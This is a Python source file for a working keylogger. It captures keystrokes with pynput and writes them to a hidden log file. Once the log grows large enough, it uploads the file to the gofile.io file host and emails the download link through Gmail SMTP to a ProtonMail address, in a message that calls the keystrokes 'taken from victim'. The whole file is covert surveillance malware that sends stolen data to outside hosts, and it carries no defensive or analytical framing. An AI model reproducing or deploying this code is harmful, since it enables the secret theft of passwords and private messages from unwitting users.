#!/usr/bin/env python3
#-------------------------------------------------------------------------
from pynput.keyboard import Listener
import os
import smtplib
import requests 
import time
import ssl
#-------------------------------------------------------------------------
log_file=".wordslog.txt"
words=[]
init=time.perf_counter()
go_file_link=''
password=""
#-------------------------------------------------------------------------
def logger():
    if len(words)>10:
       keys="".join(words)
       with open(log_file,"a") as log:
           log.write("These are the the words written at {} :::>> {}\n\n ".format(time.ctime(),keys))
           del  words[0:]
            

#---------------------------------------------------------------------------------------------------
def online():
    if requests.get("https://www.google.com").status_code ==200:
         return True
    else:
        return False
#-------------------------------------------------------------------------------------------------
def seq():
    logger()

    if os.stat(log_file).st_size>=2000:

        if online():
            run=GoFile(log_file)
            go_file_link=run.uploadit()
            emailme(go_file_link)
            os.remove(log_file)
#---------------------------------------------------------------------
class GoFile:
    def __init__(self,file):
        best_server=requests.get("https://apiv2.gofile.io/getServer").json()["data"]['server']
        self.url="https://{}.gofile.io/uploadFile".format(best_server)
        self.file=file
        
    def uploadit(self):
        
        upload_it=requests.post(self.url,files={'file':open(self.file,"rb")})
        upload_code=upload_it.json()["data"]["code"]
        return "https://gofile.io/d/{}".format(upload_code)


#----------------------------------------------------------------------------------------
def emailme(url):
    sender_email="@gmail.com"
    reciver_email="@protonmail.com"
    port=465
    con=ssl.create_default_context()
    msg='''These are the keystrokes from taken from victim at {}
   Here is the  link to keystrokes .{}
    '''.format(time.ctime(),url)


    with smtplib.SMTP_SSL("smtp.gmail.com",port,context=con) as emailserver:
        emailserver.login(sender_email,password)
        emailserver.sendmail(sender_email,reciver_email,msg)



#----------------------------------------------------------------------------------------
def  captureit(key):
    try:
        newkey=key.char
        words.append(newkey)
        seq()

    except:
        pass

#-----------------------------------------------------------------------
if __name__=="__main__":
    with Listener(on_press=captureit) as recorder:   
        recorder.join()